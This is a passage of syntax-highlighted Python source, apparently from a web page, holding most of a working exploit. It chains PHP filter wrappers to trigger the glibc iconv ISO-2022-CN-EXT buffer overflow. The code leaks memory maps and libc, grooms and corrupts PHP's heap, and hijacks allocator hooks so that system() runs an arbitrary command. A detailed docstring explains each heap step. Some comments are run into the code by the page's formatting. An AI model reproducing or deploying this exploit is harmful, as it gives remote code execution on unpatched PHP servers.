class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Expected test string: <span class="subst">&#123;text&#125;</span>&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Got: <span class="subst">&#123;result&#125;</span>&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)  </span><br><span class="line">            failure(<span class="string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_info(<span class="string">&quot;The [i]data://[/] wrapper works&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)  </span><br><span class="line">        base64 = b64(text.encode(), misalign=<span class="literal">True</span>).decode()  </span><br><span class="line">        path = <span class="string">f&quot;php://filter//resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span>  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):  </span><br><span class="line">            failure(<span class="string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_info(<span class="string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)  </span><br><span class="line">        base64 = b64(compress(text.encode()), misalign=<span class="literal">True</span>).decode()  </span><br><span class="line">        path = <span class="string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):  </span><br><span class="line">            failure(<span class="string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_info(<span class="string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_success(<span class="string">&quot;Exploit preconditions are satisfied&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">        <span class="keyword">with</span> msg_status(<span class="string">f&quot;Downloading [i]<span class="subst">&#123;path&#125;</span>[/]...&quot;</span>):  </span><br><span class="line">            <span class="keyword">return</span> self.remote.download(path)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_regions</span>(<span class="params">self</span>) -&gt; <span class="built_in">list</span>[Region]:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span>  </span><br><span class="line">        maps = self.get_file(<span class="string">&quot;/proc/self/maps&quot;</span>)  </span><br><span class="line">        maps = maps.decode()  </span><br><span class="line">        PATTERN = re.<span class="built_in">compile</span>(  </span><br><span class="line">            <span class="string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="string">r&quot;.*&quot;</span> <span class="string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="string">r&quot;(.*)&quot;</span>  </span><br><span class="line">        )  </span><br><span class="line">        regions = []  </span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> table.split(maps, strip=<span class="literal">True</span>):  </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span> := PATTERN.<span class="keyword">match</span>(region):  </span><br><span class="line">                start = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>)  </span><br><span class="line">                stop = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>)  </span><br><span class="line">                permissions = <span class="keyword">match</span>.group(<span class="number">3</span>)  </span><br><span class="line">                path = <span class="keyword">match</span>.group(<span class="number">4</span>)  </span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> path:  </span><br><span class="line">                    path = path.rsplit(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>]  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    path = <span class="string">&quot;&quot;</span>  </span><br><span class="line">                current = Region(start, stop, permissions, path)  </span><br><span class="line">                regions.append(current)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="built_in">print</span>(maps)  </span><br><span class="line">                failure(<span class="string">&quot;Unable to parse memory mappings&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        self.log.info(<span class="string">f&quot;Got <span class="subst">&#123;<span class="built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> regions  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_symbols_and_addresses</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span>  </span><br><span class="line">        regions = self.get_regions()  </span><br><span class="line">  </span><br><span class="line">        LIBC_FILE = <span class="string">&quot;/dev/shm/cnext-libc&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># PHP&#x27;s heap  </span></span><br><span class="line">  </span><br><span class="line">        self.info[<span class="string">&quot;heap&quot;</span>] = self.heap <span class="keyword">or</span> self.find_main_heap(regions)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># Libc  </span></span><br><span class="line">  </span><br><span class="line">        libc = self._get_region(regions, <span class="string">&quot;libc-&quot;</span>, <span class="string">&quot;libc.so&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        self.download_file(libc.path, LIBC_FILE)  </span><br><span class="line">  </span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="literal">False</span>)  </span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>].address = libc.start  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_region</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region], *names: <span class="built_in">str</span></span>) -&gt; Region:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span>  </span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> regions:  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(name <span class="keyword">in</span> region.path <span class="keyword">for</span> name <span class="keyword">in</span> names):  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            failure(<span class="string">&quot;Unable to locate region&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> region  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">self, remote_path: <span class="built_in">str</span>, local_path: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span>  </span><br><span class="line">        data = self.get_file(remote_path)  </span><br><span class="line">        Path(local_path).write(data)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_main_heap</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region]</span>) -&gt; Region:  </span><br><span class="line">        <span class="comment"># Any anonymous RW region with a size superior to the base heap size is a  </span></span><br><span class="line">        <span class="comment"># candidate. The heap is at the bottom of the region.        heaps = [  </span></span><br><span class="line">            region.stop - HEAP_SIZE + <span class="number">0x40</span>  </span><br><span class="line">            <span class="keyword">for</span> region <span class="keyword">in</span> <span class="built_in">reversed</span>(regions)  </span><br><span class="line">            <span class="keyword">if</span> region.permissions == <span class="string">&quot;rw-p&quot;</span>  </span><br><span class="line">            <span class="keyword">and</span> region.size &gt;= HEAP_SIZE  </span><br><span class="line">            <span class="keyword">and</span> region.stop &amp; (HEAP_SIZE - <span class="number">1</span>) == <span class="number">0</span>  </span><br><span class="line">            <span class="keyword">and</span> region.path <span class="keyword">in</span> (<span class="string">&quot;&quot;</span>, <span class="string">&quot;[anon:zend_alloc]&quot;</span>)  </span><br><span class="line">        ]  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> heaps:  </span><br><span class="line">            failure(<span class="string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        first = heaps[<span class="number">0</span>]  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(heaps) &gt; <span class="number">1</span>:  </span><br><span class="line">            heaps = <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, heaps))  </span><br><span class="line">            msg_info(<span class="string">f&quot;Potential heaps: [i]<span class="subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            msg_info(<span class="string">f&quot;Using [i]<span class="subst">&#123;<span class="built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> first  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        self.check_vulnerable()  </span><br><span class="line">        self.get_symbols_and_addresses()  </span><br><span class="line">        self.exploit()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_exploit_path</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the  </span></span><br><span class="line"><span class="string">        other. Processing generally involves making some kind of operation either        on the chunk or in a destination chunk of the same size. Each operation is        applied on every single chunk; you cannot make PHP apply iconv on the first 10        chunks and leave the rest in place. That&#x27;s where the difficulties come from.  </span></span><br><span class="line"><span class="string">        Keep in mind that we know the address of the main heap, and the libraries.        ASLR/PIE do not matter here.  </span></span><br><span class="line"><span class="string">        The idea is to use the bug to make the freelist for chunks of size 0x100 point        lower. For instance, we have the following free list:  </span></span><br><span class="line"><span class="string">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00  </span></span><br><span class="line"><span class="string">        By triggering the bug from chunk ..900, we get:  </span></span><br><span class="line"><span class="string">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???  </span></span><br><span class="line"><span class="string">        That&#x27;s step 3.  </span></span><br><span class="line"><span class="string">        Now, in order to control the free list, and make it point whereever we want,        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.        That&#x27;s step 2.  </span></span><br><span class="line"><span class="string">        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have        a problem: after step2 has been processed, the free list goes bottom-up, like:  </span></span><br><span class="line"><span class="string">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900  </span></span><br><span class="line"><span class="string">        We need to go the other way around. That&#x27;s why we have step 1: it just allocates        chunks. When they get freed, they reverse the free list. Now step2 allocates in        reverse order, and therefore after step2, chunks are in the correct order.  </span></span><br><span class="line"><span class="string">        Another problem comes up.  </span></span><br><span class="line"><span class="string">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.        Since step2 creates chunks that contain pointers and pointers are generally not        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.        To avoid this, we put the chunks in step2 at the very end of the chain, and        prefix them with `0\n`. When dechunked (right before the iconv), they will        &quot;disappear&quot; from the chain, preserving them from the character set conversion        and saving us from an unwanted processing error that would stop the processing        chain.  </span></span><br><span class="line"><span class="string">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We        don&#x27;t know the precise layout of the heap, but we know that at the top of the        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.        Its free_slot[] array contains a pointer to each free list. By overwriting it,        we can make PHP allocate chunks whereever we want. In addition, its custom_heap        field contains pointers to hook functions for emalloc, efree, and erealloc        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and        then overwrite the use_custom_heap flag to make PHP use these function pointers        instead. We can now do our favorite CTF technique and get a call to        system(&lt;chunk&gt;).        We make sure that the &quot;system&quot; command kills the current process to avoid other        system() calls with random chunk data, leading to undefined behaviour.  </span></span><br><span class="line"><span class="string">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the        process is in a random state, we still get contiguous, in order chunks for our        exploit.  </span></span><br><span class="line"><span class="string">        Therefore, the whole process described here CANNOT crash. Everything falls        perfectly in place, and nothing can get in the middle of our allocations.        &quot;&quot;&quot;</span>  </span><br><span class="line">        LIBC = self.info[<span class="string">&quot;libc&quot;</span>]  </span><br><span class="line">        ADDR_EMALLOC = LIBC.symbols[<span class="string">&quot;__libc_malloc&quot;</span>]  </span><br><span class="line">        ADDR_EFREE = LIBC.symbols[<span class="string">&quot;__libc_system&quot;</span>]  </span><br><span class="line">        ADDR_EREALLOC = LIBC.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]  </span><br><span class="line">  </span><br><span class="line">        ADDR_HEAP = self.info[<span class="string">&quot;heap&quot;</span>]  </span><br><span class="line">        ADDR_FREE_SLOT = ADDR_HEAP + <span class="number">0x20</span>  </span><br><span class="line">        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="number">0x0168</span>  </span><br><span class="line">  </span><br><span class="line">        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="number">0x10</span>  </span><br><span class="line">  </span><br><span class="line">        CS = <span class="number">0x100</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># Pad needs to stay at size 0x100 at every step  </span></span><br><span class="line">        pad_size = CS - <span class="number">0x18</span>  </span><br><span class="line">        pad = <span class="string">b&quot;\x00&quot;</span> * pad_size  </span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)  </span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)  </span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)  </span><br><span class="line">        pad = compressed_bucket(pad)  </span><br><span class="line">  </span><br><span class="line">        step1_size = <span class="number">1</span>  </span><br><span class="line">        step1 = <span class="string">b&quot;\x00&quot;</span> * step1_size  </span><br><span class="line">        step1 = chunked_chunk(step1)  </span><br><span class="line">        step1 = chunked_chunk(step1)  </span><br><span class="line">        step1 = chunked_chunk(step1, CS)  </span><br><span class="line">        step1 = compressed_bucket(step1)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to  </span></span><br><span class="line">        <span class="comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;  </span></span><br><span class="line">        step2_size = <span class="number">0x48</span>  </span><br><span class="line">        step2 = <span class="string">b&quot;\x00&quot;</span> * (step2_size + <span class="number">8</span>)  </span><br><span class="line">        step2 = chunked_chunk(step2, CS)  </span><br><span class="line">        step2 = chunked_chunk(step2)  </span><br><span class="line">        step2 = compressed_bucket(step2)  </span><br><span class="line">  </span><br><span class="line">        step2_write_ptr = <span class="string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)  </span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)  </span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr)  </span><br><span class="line">        step2_write_ptr = compressed_bucket(step2_write_ptr)  </span><br><span class="line">  </span><br><span class="line">        step3_size = CS  </span><br><span class="line">  </span><br><span class="line">        step3 = <span class="string">b&quot;\x00&quot;</span> * step3_size  </span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3) == CS  </span><br><span class="line">        step3 = chunked_chunk(step3)  </span><br><span class="line">        step3 = chunked_chunk(step3)  </span><br><span class="line">        step3 = chunked_chunk(step3)  </span><br><span class="line">        step3 = compressed_bucket(step3)  </span><br><span class="line">  </span><br><span class="line">        step3_overflow = <span class="string">b&quot;\x00&quot;</span> * (step3_size - <span class="built_in">len</span>(BUG)) + BUG  </span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3_overflow) == CS  </span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)  </span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)  </span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)  </span><br><span class="line">        step3_overflow = compressed_bucket(step3_overflow)  </span><br><span class="line">  </span><br><span class="line">        step4_size = CS  </span><br><span class="line">        step4 = <span class="string">b&quot;=00&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (step4_size - <span class="number">1</span>)  </span><br><span class="line">        step4 = chunked_chunk(step4)  </span><br><span class="line">        step4 = chunked_chunk(step4)  </span><br><span class="line">        step4 = chunked_chunk(step4)  </span><br><span class="line">        step4 = compressed_bucket(step4)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot  </span></span><br><span class="line">        <span class="comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values        step4_pwn = ptr_bucket(  </span></span><br><span class="line">            <span class="number">0x200000</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="comment"># free_slot  </span></span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            ADDR_CUSTOM_HEAP,  <span class="comment"># 0x18  </span></span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            ADDR_HEAP,  <span class="comment"># 0x140  </span></span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            size=CS,  </span><br><span class="line">        )  </span><br><span class="line">  </span><br><span class="line">        step4_custom_heap = ptr_bucket(  </span><br><span class="line">            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="number">0x18</span>  </span><br><span class="line">        )  </span><br><span class="line">  </span><br><span class="line">        step4_use_custom_heap_size = <span class="number">0x140</span>  </span><br><span class="line">  </span><br><span class="line">        COMMAND = self.command  </span><br><span class="line">        COMMAND = <span class="string">f&quot;kill -9 $PPID; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span>  </span><br><span class="line">        <span class="keyword">if</span> self.sleep:  </span><br><span class="line">            COMMAND = <span class="string">f&quot;sleep <span class="subst">&#123;self.sleep&#125;</span>; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span>  </span><br><span class="line">        COMMAND = COMMAND.encode() + <span class="string">b&quot;\x00&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">assert</span> (  </span><br><span class="line">                <span class="built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size  </span><br><span class="line">        ), <span class="string">f&quot;Command too big (<span class="subst">&#123;<span class="built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="subst">&#123;<span class="built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span>  </span><br><span class="line">        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="string">b&quot;\x00&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        step4_use_custom_heap = COMMAND  </span><br><span class="line">        step4_use_custom_heap = qpe(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)  </span><br><span class="line">  </span><br><span class="line">        pages = (  </span><br><span class="line">                step4 * <span class="number">3</span>  </span><br><span class="line">                + step4_pwn  </span><br><span class="line">                + step4_custom_heap  </span><br><span class="line">                + step4_use_custom_heap  </span><br><span class="line">                + step3_overflow  </span><br><span class="line">                + pad * self.pad  </span><br><span class="line">                + step1 * <span class="number">3</span>  </span><br><span class="line">                + step2_write_ptr  </span><br><span class="line">                + step2 * <span class="number">2</span>  </span><br><span class="line">        )  </span><br><span class="line">  </span><br><span class="line">        resource = compress(compress(pages))  </span><br><span class="line">        resource = b64(resource)  </span><br><span class="line">        resource = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;resource.decode()&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        filters = [  </span><br><span class="line">            <span class="comment"># Create buckets  </span></span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 0: Setup heap  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 1: Reverse FL order  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 2: Put fake pointer and make FL order back to normal  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 3: Trigger overflow  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap  </span></span><br><span class="line">            <span class="string">&quot;convert.quoted-printable-decode&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">        ]  </span><br><span class="line">        filters = <span class="string">&quot;|&quot;</span>.join(filters)  </span><br><span class="line">        path = <span class="string">f&quot;php://filter/read=<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;resource&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> path  </span><br><span class="line">  </span><br><span class="line"><span class="meta">    @inform(<span class="params"><span class="string">&quot;Triggering...&quot;</span></span>)  </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        path = self.build_exploit_path()  </span><br><span class="line">        start = time.time()  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            self.remote.send(path)  </span><br><span class="line">        <span class="keyword">except</span> (ConnectionError, ChunkedEncodingError):  </span><br><span class="line">            <span class="keyword">pass</span>  </span><br><span class="line">  </span><br><span class="line">        msg_print()  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.sleep:  </span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)  </span><br><span class="line">        <span class="keyword">elif</span> start + self.sleep &lt;= time.time():  </span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="comment"># Wrong heap, maybe? If the exploited suggested others, use them!  </span></span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_print()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    <span class="comment"># Remove 2-byte header and 4-byte checksum  </span></span><br><span class="line">    <span class="keyword">return</span> zlib.compress(data, <span class="number">9</span>)[<span class="number">2</span>:-<span class="number">4</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64</span>(<span class="params">data: <span class="built_in">bytes</span>, misalign=<span class="literal">True</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    payload = base64.encode(data)  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> misalign <span class="keyword">and</span> payload.endswith(<span class="string">&quot;=&quot;</span>):  </span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Misaligned: <span class="subst">&#123;data&#125;</span>&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> payload.encode()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compressed_bucket</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">return</span> chunked_chunk(data, <span class="number">0x8000</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpe</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates quoted-printable-encode.  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;=<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data).upper().encode()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ptr_bucket</span>(<span class="params">*ptrs, size=<span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:  </span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ptrs) * <span class="number">8</span> == size  </span><br><span class="line">    bucket = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">map</span>(p64, ptrs))  </span><br><span class="line">    bucket = qpe(bucket)  </span><br><span class="line">    bucket = chunked_chunk(bucket)  </span><br><span class="line">    bucket = chunked_chunk(bucket)  </span><br><span class="line">    bucket = chunked_chunk(bucket)  </span><br><span class="line">    bucket = compressed_bucket(bucket)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> bucket  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunked_chunk</span>(<span class="params">data: <span class="built_in">bytes</span>, size: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the  </span></span><br><span class="line"><span class="string">    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    &quot;&quot;&quot;</span>    <span class="comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than  </span></span><br><span class="line">    <span class="comment"># enough    if size is None:  </span></span><br><span class="line">        size = <span class="built_in">len</span>(data) + <span class="number">8</span>  </span><br><span class="line">    keep = <span class="built_in">len</span>(data) + <span class="built_in">len</span>(<span class="string">b&quot;\n\n&quot;</span>)  </span><br><span class="line">    size = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="string">&quot;0&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> 